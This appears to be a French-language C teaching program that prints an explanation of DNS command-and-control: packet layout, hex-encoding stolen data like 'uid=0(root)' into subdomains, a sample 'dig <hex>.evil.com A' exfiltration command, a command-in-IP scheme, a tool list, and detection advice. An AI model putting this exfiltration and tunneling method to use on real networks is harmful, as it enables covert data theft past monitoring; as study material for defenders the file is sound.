/*
 * OBJECTIF  : Comprendre les communications DNS pour le C2
 * PREREQUIS : Bases C, sockets UDP, protocole DNS
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques DNS utilisees par les
 * implants C2 : resolution standard, tunneling DNS, exfiltration
 * de donnees via les sous-domaines, et encodage des donnees.
 * Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>

/*
 * Etape 1 : DNS comme canal C2
 */
static void explain_dns_c2(void) {
    printf("[*] Etape 1 : DNS comme canal de communication C2\n\n");

    printf("    ┌──────────────┐   DNS Query    ┌──────────────┐\n");
    printf("    │   IMPLANT    │ ─────────────> │  DNS RECURSOR │\n");
    printf("    │              │                │              │\n");
    printf("    │ data.evil.com│                │ Forward to   │\n");
    printf("    └──────────────┘                │ authoritative│\n");
    printf("                                    └──────┬───────┘\n");
    printf("                                           │\n");
    printf("                                           v\n");
    printf("                                    ┌──────────────┐\n");
    printf("                                    │ C2 DNS AUTH  │\n");
    printf("                                    │  evil.com    │\n");
    printf("                                    │ Decode query │\n");
    printf("                                    │ Return cmd   │\n");
    printf("                                    └──────────────┘\n\n");

    printf("    Pourquoi DNS :\n");
    printf("    - Port 53 presque jamais bloque\n");
    printf("    - Le trafic DNS est rarement inspecte en profondeur\n");
    printf("    - Traverse les reseaux les plus restrictifs\n");
    printf("    - Difficile a bloquer sans casser la resolution\n\n");

    printf("    Limitations :\n");
    printf("    - Bande passante limitee (~200 octets par requete)\n");
    printf("    - Latence elevee (cache DNS, TTL)\n");
    printf("    - De plus en plus surveille (DNS logs)\n\n");
}

/*
 * Etape 2 : Structure d'un paquet DNS
 */
static void explain_dns_structure(void) {
    printf("[*] Etape 2 : Structure d'un paquet DNS\n\n");

    printf("    ┌──────────────────────────────────────┐\n");
    printf("    │         DNS HEADER (12 octets)       │\n");
    printf("    │  ID (2)  | Flags (2) | QDCount (2)  │\n");
    printf("    │  ANCount (2) | NSCount (2) | ARCount │\n");
    printf("    ├──────────────────────────────────────┤\n");
    printf("    │         QUESTION SECTION              │\n");
    printf("    │  QNAME  : nom encode (labels)        │\n");
    printf("    │  QTYPE  : A(1), TXT(16), CNAME(5)   │\n");
    printf("    │  QCLASS : IN(1)                      │\n");
    printf("    ├──────────────────────────────────────┤\n");
    printf("    │         ANSWER SECTION                │\n");
    printf("    │  NAME | TYPE | CLASS | TTL | RDATA   │\n");
    printf("    └──────────────────────────────────────┘\n\n");

    printf("    Types de records utiles pour le C2 :\n");
    printf("    Type   | Usage C2\n");
    printf("    ───────|─────────────────────────────────\n");
    printf("    A      | Commandes encodees dans l'IP\n");
    printf("    TXT    | Donnees en base64 (jusqu'a 255 octets)\n");
    printf("    CNAME  | Redirection / rebond\n");
    printf("    MX     | Donnees dans le champ exchange\n");
    printf("    NULL   | Donnees arbitraires (rare)\n\n");
}

/*
 * Etape 3 : Resolution DNS standard
 */
static void demo_dns_resolve(void) {
    printf("[*] Etape 3 : Resolution DNS standard\n\n");

    const char *names[] = {"example.com", "google.com", NULL};

    for (int i = 0; names[i]; i++) {
        struct addrinfo hints = {0}, *res, *p;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        int ret = getaddrinfo(names[i], NULL, &hints, &res);
        if (ret != 0) {
            printf("    %s : erreur - %s\n", names[i], gai_strerror(ret));
            continue;
        }

        printf("    %s :\n", names[i]);
        int count = 0;
        for (p = res; p && count < 3; p = p->ai_next, count++) {
            struct sockaddr_in *addr = (struct sockaddr_in *)p->ai_addr;
            printf("      -> %s\n", inet_ntoa(addr->sin_addr));
        }
        freeaddrinfo(res);
    }
    printf("\n");
}

/*
 * Etape 4 : Exfiltration par sous-domaines
 */
static void explain_dns_exfiltration(void) {
    printf("[*] Etape 4 : Exfiltration de donnees par DNS\n\n");

    printf("    Principe : encoder les donnees dans le sous-domaine\n\n");

    printf("    Donnees a exfiltrer : \"uid=0(root)\"\n\n");

    /* Encodage hex des donnees */
    const char *data = "uid=0(root)";
    printf("    1. Encodage hexadecimal :\n");
    printf("       ");
    char hex_data[128] = {0};
    int pos = 0;
    for (int i = 0; data[i]; i++) {
        pos += sprintf(hex_data + pos, "%02x", (unsigned char)data[i]);
    }
    printf("%s\n\n", hex_data);

    /* Construction du domaine */
    printf("    2. Construction du domaine :\n");
    printf("       %s.evil.com\n\n", hex_data);

    printf("    3. La requete DNS est envoyee :\n");
    printf("       dig %s.evil.com A\n\n", hex_data);

    printf("    4. Le serveur C2 autoritaire pour evil.com :\n");
    printf("       - Recoit la requete\n");
    printf("       - Decode le sous-domaine hex -> \"uid=0(root)\"\n");
    printf("       - Repond avec une commande encodee dans l'IP\n\n");

    /* Decodage de la reponse */
    printf("    Encodage des commandes dans la reponse :\n");
    printf("    ───────────────────────────────────────\n");
    printf("    IP = 10.CMD.ARG1.ARG2\n");
    printf("    10.1.0.0 = commande 'exec shell'\n");
    printf("    10.2.0.0 = commande 'upload file'\n");
    printf("    10.3.0.0 = commande 'sleep 300'\n\n");

    /* Labels DNS : max 63 chars, total 253 */
    printf("    Contraintes DNS :\n");
    printf("    - Label max : 63 caracteres\n");
    printf("    - Nom total max : 253 caracteres\n");
    printf("    - ~120 octets de donnees par requete (hex encode)\n");
    printf("    - Fragmentation necessaire pour les gros transferts\n\n");
}

/*
 * Etape 5 : Simulation d'encodage DNS tunneling
 */
static void demo_dns_encoding(void) {
    printf("[*] Etape 5 : Simulation d'encodage pour DNS tunneling\n\n");

    /* Donnees a envoyer */
    const char *payload = "HOSTNAME=server01;IP=192.168.1.50;OS=Linux";
    printf("    Donnees brutes : %s\n", payload);
    printf("    Taille         : %zu octets\n\n", strlen(payload));

    /* Encodage base32-like (hex pour simplifier) */
    printf("    Fragmentation en labels DNS (max 63 chars) :\n");
    char hex[256] = {0};
    int p = 0;
    for (size_t i = 0; payload[i]; i++)
        p += sprintf(hex + p, "%02x", (unsigned char)payload[i]);

    int frag = 0;
    int hex_len = strlen(hex);
    for (int i = 0; i < hex_len; i += 60) {
        int chunk = hex_len - i;
        if (chunk > 60) chunk = 60;
        printf("    Label %d : %.*s\n", frag++, chunk, hex + i);
    }

    /* Reconstitution du domaine */
    printf("\n    Requete DNS complete :\n    ");
    for (int i = 0; i < hex_len; i += 60) {
        int chunk = hex_len - i;
        if (chunk > 60) chunk = 60;
        printf("%.*s.", chunk, hex + i);
    }
    printf("evil.com\n\n");

    /* Decodage */
    printf("    Decodage cote serveur :\n    ");
    for (int i = 0; i < hex_len; i += 2) {
        unsigned int c;
        sscanf(hex + i, "%2x", &c);
        putchar(c);
    }
    printf("\n\n");
}

/*
 * Etape 6 : Outils et frameworks DNS C2
 */
static void explain_dns_tools(void) {
    printf("[*] Etape 6 : Outils et frameworks DNS C2\n\n");

    printf("    Outil       | Description\n");
    printf("    ────────────|──────────────────────────────────\n");
    printf("    iodine      | Tunnel IP over DNS (TUN interface)\n");
    printf("    dnscat2     | C2 complet via DNS (chiffre)\n");
    printf("    DNSExfil    | Exfiltration de fichiers par DNS\n");
    printf("    Cobalt C2   | Profil DNS malleable\n");
    printf("    dns2tcp     | Tunnel TCP via DNS\n\n");

    printf("    Implementation d'un client DNS minimal :\n");
    printf("    ───────────────────────────────────────\n");
    printf("    // 1. Creer un socket UDP\n");
    printf("    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n\n");
    printf("    // 2. Construire le paquet DNS manuellement\n");
    printf("    // Header (12 octets) + Question section\n");
    printf("    unsigned char pkt[512];\n");
    printf("    // ID = random, Flags = 0x0100 (standard query)\n");
    printf("    // QDCOUNT = 1\n\n");
    printf("    // 3. Encoder le QNAME\n");
    printf("    // \"data.evil.com\" -> \\x04data\\x04evil\\x03com\\x00\n\n");
    printf("    // 4. Envoyer au resolver (port 53)\n");
    printf("    sendto(sock, pkt, len, 0, ...);\n\n");
    printf("    // 5. Recevoir et parser la reponse\n");
    printf("    recvfrom(sock, resp, sizeof(resp), 0, ...);\n\n");
}

/*
 * Etape 7 : Detection du DNS tunneling
 */
static void explain_detection(void) {
    printf("[*] Etape 7 : Detection du DNS tunneling\n\n");

    printf("    Indicateurs suspects :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Volume DNS anormal pour un hote\n");
    printf("       -> Baseline puis detection d'anomalies\n\n");
    printf("    2. Sous-domaines tres longs ou aleatoires\n");
    printf("       -> Entropie elevee dans les labels\n\n");
    printf("    3. Types de records inhabituels (TXT, NULL, MX)\n");
    printf("       -> Ratio TXT/A anormalement eleve\n\n");
    printf("    4. Requetes vers des domaines recents/suspects\n");
    printf("       -> Threat intelligence DNS\n\n");
    printf("    5. Frequence elevee de requetes vers un meme domaine\n");
    printf("       -> Beaconing pattern\n\n");

    printf("    Protections :\n");
    printf("    - DNS filtering (Pi-hole, Cisco Umbrella)\n");
    printf("    - DNS-over-HTTPS monitoring\n");
    printf("    - Forcer l'utilisation du resolver interne\n");
    printf("    - Bloquer les requetes DNS directes (port 53 sortant)\n");
    printf("    - Inspection DPI sur le trafic DNS\n\n");
}

int main(void) {
    printf("[*] Demo : DNS Linux - Communication et Tunneling C2\n\n");

    explain_dns_c2();
    explain_dns_structure();
    demo_dns_resolve();
    explain_dns_exfiltration();
    demo_dns_encoding();
    explain_dns_tools();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
